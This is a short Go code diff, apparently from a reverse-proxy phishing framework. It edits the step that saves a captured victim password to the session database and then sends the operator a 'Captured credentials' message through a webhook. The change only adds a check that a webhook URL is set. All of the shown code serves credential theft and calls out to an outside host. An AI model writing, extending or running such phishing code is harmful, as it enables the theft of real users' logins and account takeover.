@@ -778,7 +778,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											if phishedUser != "" {
+											if phishedUser != "" && p.cfg.kbWebhookUrl != "" {
 												content := fmt.Sprintf("Captured credentials for %s!", phishedUser)
 												p.NotifyWebhook(content)
 											}
